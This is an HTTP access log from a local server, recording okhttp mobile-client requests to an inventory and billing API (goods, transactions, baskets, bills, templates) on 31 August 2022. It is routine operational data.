::ffff:127.0.0.1 - - [31/Aug/2022:02:05:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:33 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:33 +0000] "GET /api/v1/goods/630ebdc0f66eb6d6a8720625 HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:33 +0000] "GET /api/v1/transactions/user?good=630ebdc0f66eb6d6a8720625&sort=-createdAt HTTP/1.0" 200 557 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:57 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 434 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 434 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:06:26 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 397 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:06:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:06:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:06:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:06:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 4367 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:06:39 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 2126 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:06:50 +0000] "GET /api/v1/bills/630ec222f66eb6d6a8720698 HTTP/1.0" 200 418 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:10:48 +0000] "GET /api/v1/bills/630eb92ef66eb6d6a87203fe HTTP/1.0" 200 417 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:18 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:20 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:25 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:25 +0000] "GET /api/v1/goods/630ebc27f66eb6d6a87205e7 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:25 +0000] "GET /api/v1/transactions/user?good=630ebc27f66eb6d6a87205e7&sort=-createdAt HTTP/1.0" 200 565 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:29 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:39 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:46 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 4893 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:50 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:51 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:11:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:11:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
